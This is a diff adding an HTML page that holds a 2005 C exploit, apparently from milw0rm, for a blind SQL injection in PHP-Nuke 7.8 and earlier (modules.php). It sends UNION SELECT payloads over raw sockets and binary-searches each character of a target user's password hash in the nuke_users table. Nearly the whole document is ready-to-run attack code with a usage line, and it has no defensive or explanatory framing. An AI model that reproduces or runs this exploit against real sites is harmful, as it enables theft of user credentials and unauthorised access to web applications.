@@ -1,0 +1,140 @@
+<html>
+<head>
+<title>PHP-Nuke <= 7.8 (modules.php) SQL Injection Exploit</title>
+<pre>
+/***********************************************
+* PHP-Nuke &lt;=7.8 SQL injection exploit
+* need MySQL &gt; 4.0
+* (c)oded by 1dt.w0lf
+* RST/GHC
+* http://rst.void.ru
+* http://ghc.ru
+************************************************/
+// tested on 7.8
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;regex.h&gt;
+
+#define START 47
+#define END   103
+#define SZ    1024
+#define PORT  80
+#define PREFIX &quot;nuke_&quot;
+#define SQL &quot;name=PHP-Nuke%%207.8%%20Exploit'%%20UNION%%20SELECT%%201,1%%20FROM%%20%susers%%20WHERE%%20user_id=%d%%20AND%%20ascii(substring(user_password,%d,1))%c%d/*&quot;
+
+
+main (int argc, char **argv) {
+ int pos;
+ int res = 0;
+ char result[33];
+	
+ if(argc&lt;4)
+  {
+  printf(&quot;Usage %s [host] [/folder/] [user_id]\n&quot;,argv[0]);
+  exit(1);
+  }
+ 
+ printf(&quot;PHP-Nuke &lt;= 7.8 SQL injection exploit\n&quot;
+         &quot;-------------------------------------\n&quot;
+         &quot;[~] Host : %s\n[~] Folder: %s\n&quot;
+         &quot;[!] Searching password for user with id : %d\n&quot;
+         &quot;[!] Please wait...\n&quot;,argv[1],argv[2],atoi(argv[3]));  
+ for(pos=1;pos&lt;33;pos++)
+  {	 
+  found(argv[1],argv[2],atoi(argv[3]),START,END,pos,&amp;res);  
+  sprintf(result+pos-1,&quot;%c&quot;,res);
+  if(res == 0) { break; }
+  }
+ result[33] = '\0';
+ if(strlen(result)&gt;0) printf(&quot;[+] Password: %s\n&quot;,result);
+ else printf(&quot;[-] Password not found\n&quot;);
+ exit (0);
+}
+
+int found(char * host, char * folder, int user_id, int min, int max, int pos, int * res)
+ {
+ int i;
+ int sr = (max - ((max-min)/2));
+ if( (max-min) &lt; 6 ) { i=(brute(host,folder,user_id,min,max,pos)); *res = i; }
+ else if( (check(host,folder,pos,'&gt;',sr,user_id)) == 1 ) { found(host,folder,user_id,sr,max,pos,res); }
+ else { found(host,folder,user_id,min,sr,pos,res);	} 
+ return 0;
+ }
+
+int brute(char * host, char * folder, int user_id, int min, int max, int pos)
+ {	 
+ int i;
+ for(i=min-1;i&lt;max+1;i++)
+  {
+  if((check(host,folder,pos,'=',i, user_id)) == 1) { return i; }
+  }
+ return 0;  
+ }	 
+ 
+int check(char * host, char * folder, int pos, int chk, int test, int user_id)
+ {
+ char req[SZ]; 
+ char ans[SZ];
+ char sql[SZ];
+ int sock;
+ struct hostent *hp;
+ struct sockaddr_in sin;
+ regex_t re;
+ char *pattern = &quot;Sorry, this Module isn't active!&quot;;
+ 
+ if( (sock = socket (AF_INET, SOCK_STREAM, 0)) &lt; 0 )
+  {
+   printf(&quot;[ ERROR ] Can't create socket!\n&quot;);
+   exit(1);
+  } 
+  
+ if( (regcomp( &amp;re, pattern, REG_EXTENDED )) != 0 )
+  {
+  printf(&quot;[ ERROR ] REG ERROR!\n&quot;);
+  exit(1);
+  }
+  
+ bzero(&amp;sin, sizeof(sin));
+ sin.sin_family = AF_INET;
+ sin.sin_port   = htons(PORT);
+ hp = gethostbyname (host);
+  
+ memcpy ((char *)&amp;sin.sin_addr,hp-&gt;h_addr,hp-&gt;h_length);
+ connect (sock, (struct sockaddr *)&amp;sin, sizeof(sin)); 
+  
+ bzero(req,sizeof(req));
+ bzero(ans,sizeof(ans));
+ bzero(sql,sizeof(sql));	 
+	 
+ snprintf(sql,SZ-1,SQL,PREFIX,user_id,pos,chk,test);	 
+ 
+ snprintf(req,SZ-1,&quot;POST %smodules.php HTTP/1.0\n&quot;
+                  &quot;Host: %s\n&quot;
+                  &quot;Content-Type: application/x-www-form-urlencoded\n&quot;
+                  &quot;Content-Length: %d\n\n&quot;
+                  &quot;%s\n\n\n&quot;,
+                  folder,
+				  host,
+                  strlen(sql),
+                  sql);
+ 
+ write(sock, req, strlen(req));
+
+ while( (read(sock, &amp;ans, SZ-1)) &gt; 0 )
+  {
+  if( (regexec( &amp;re, ans, 0, NULL, 0)) == 0) { return 0; }
+  bzero(ans,sizeof(ans));
+  } 
+ close (sock); 
+ return 1;	 
+ }
+
+// milw0rm.com [2005-09-16]
+</pre>
+</html>
+
